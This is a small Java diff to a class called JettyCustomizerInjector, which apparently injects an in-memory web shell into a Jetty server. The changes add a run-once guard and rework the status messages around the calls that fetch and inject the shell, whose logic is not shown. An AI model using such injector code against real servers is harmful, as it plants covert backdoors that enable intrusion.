@@ -18,6 +18,7 @@ import java.util.zip.GZIPInputStream;
 public class JettyCustomizerInjector {
 
     private String msg = "";
+    private static boolean ok = false;
 
     public String getClassName() {
         return "{{className}}";
@@ -28,6 +29,9 @@ public class JettyCustomizerInjector {
     }
 
     public JettyCustomizerInjector() {
+        if (ok) {
+            return;
+        }
         Object channel = null;
         try {
             channel = getChannel();
@@ -35,10 +39,10 @@ public class JettyCustomizerInjector {
             msg += "channel error: " + getErrorMessage(throwable);
         }
         if (channel == null) {
-            msg += "channel is null";
+            msg += "channel not found";
         } else {
-            msg += ("channel: [" + channel + "] ");
             try {
+                msg += ("channel: [" + channel + "] ");
                 Object shell = getShell(channel);
                 inject(channel, shell);
                 msg += "[/*] ready\n";
@@ -46,6 +50,7 @@ public class JettyCustomizerInjector {
                 msg += "failed " + getErrorMessage(e) + "\n";
             }
         }
+        ok = true;
         System.out.println(msg);
     }
 
